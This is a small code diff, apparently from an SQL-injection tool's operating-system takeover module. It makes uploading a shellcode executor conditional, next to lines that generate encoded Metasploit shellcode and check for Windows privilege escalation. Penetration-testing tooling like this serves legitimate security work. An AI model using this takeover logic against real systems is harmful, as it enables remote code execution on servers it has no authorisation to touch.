@@ -198,7 +198,9 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                     exitfunc="process"
 
                 self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
-                self.uploadShellcodeexec()
+
+                if not goUdf:
+                    self.uploadShellcodeexec()
 
                 if Backend.isOs(OS.WINDOWS) and conf.privEsc:
                     if Backend.isDbms(DBMS.MYSQL):
